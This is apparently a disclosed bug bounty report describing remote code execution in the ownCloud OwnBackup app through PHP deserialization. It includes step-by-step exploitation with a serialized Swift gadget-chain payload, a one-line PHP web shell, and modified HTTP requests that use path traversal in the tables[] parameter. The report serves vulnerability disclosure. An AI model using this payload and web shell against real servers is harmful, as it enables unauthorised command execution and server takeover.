# Remote Code Execution through Deserialization Attack in OwnBackup app.

## Report Details
- **Report ID**: 562335
- **URL**: https://hackerone.com/reports/562335
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-05-02T21:35:03.162Z
- **Disclosed**: 2019-07-01T16:35:37.405Z

## Reporter
- **Username**: q3rv0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
I found a deserialization vulnerability in the [OwnBackup](https://marketplace.owncloud.com/apps/ownbackup) app, this vulnerability allows to execute remote code in the server. 

An administrator user could install the vulnerable app, or take advantage of this vulnerability if the **OwnBackup** application is installed.

Below are the steps to properly exploit the deserialization vulnerability.

**Step 1:** Login in the Owncloud application as an administrator user.

**Step 2:** Install the **OwnBackup** app from the Marketplace.

**Step 3:** Go to **Files** and upload the following files to the server.

* **structure.xml**
```
<?xml version="1.0" ?>
<database><name>*dbname*</name><create>true</create><overwrite>false</overwrite><charset>utf8mb4</charset><table><name>oc_accounts</name><declaration><field><name>id</name><type>integer</type><default>0</default><notnull>true</notnull><autoincrement>1</autoincrement><unsigned>true</unsigned><length>8</length></field><field><name>email</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>lower_user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>display_name</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>quota</name><type>text</type><default/><notnull>false</notnull><length>32</length></field><field><name>last_login</name><type>integer</type><default>0</default><notnull>true</notnull><length>4</length></field><field><name>backend</name><type>text</type><default/><notnull>true</notnull><length>64</length></field><field><name>home</name><type>text</type><default/><notnull>true</notnull><length>1024</length></field><field><name>state</name><type>integer</type><default>0</default><notnull>true</notnull><length>2</length></field><index><name>UNIQ_907AA303A76ED395</name><unique>true</unique><field><name>user_id</name><sorting>ascending</sorting></field></index><index><name>lower_user_id_index</name><unique>true</unique><field><name>lower_user_id</name><sorting>ascending</sorting></field></index><index><name>display_name_index</name><field><name>display_name</name><sorting>ascending</sorting></field></index><index><name>email_index</name><field><name>email</name><sorting>ascending</sorting></field></index></declaration></table></database>
```

* **data.dump**
```
O:33:"Swift_Transport_SendmailTransport":3:{s:10:"*_buffer";O:31:"Swift_ByteStream_FileByteStream":4:{s:38:"Swift_ByteStream_FileByteStream_path";s:14:"/tmp/pwned.php";s:38:"Swift_ByteStream_FileByteStream_mode";s:3:"w+b";s:56:"Swift_ByteStream_AbstractFilterableInputStream_filters";a:0:{}s:60:"Swift_ByteStream_AbstractFilterableInputStream_writeBuffer";s:57:"<?php system($_GET['exec']); ?> // fedef@secsignal.org
//";}s:11:"*_started";b:1;s:19:"*_eventDispatcher";O:34:"Swift_Events_SimpleEventDispatcher":0:{}}
```

**Step 4:** Go to **admin** > **Settings** > **Additional**.

**Step 5:** In **OwnBackup** > **Create Backup**.

**Step 6:** Select the created backup and select any table to restore > **Restore tables**

**Step 7:** Capture the next request with the BurpSuite proxy.

```
POST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: 
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 45
Cookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5
Connection: close

timestamp=1555661563&tables%5B%5D=oc_accounts
```
And change the value of the parameter **tables[]** by the following path traversal.

```
../../admin/files
```
The modified request is left as follows.

```
POST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: 
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 45
Cookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5
Connection: close

timestamp=1555661563&tables%5B%5D=../../admin/files
```
The serialized payload within the **data.dump** file is intended to create the file **pwned.php** within the **/tmp** directory as a PoC. But the same file could be created within the web directory, to execute commands remotely.

Contents of the file pwned.php.
```
<?php system($_GET['exec']); ?> // fedef@secsignal.org
```
**Step 8:** View the **/tmp/pwned.php** file created correctly.

## Impact

An attacker could execute commands remotely on the server.

## Attachments
- structure.xml
- data.dump
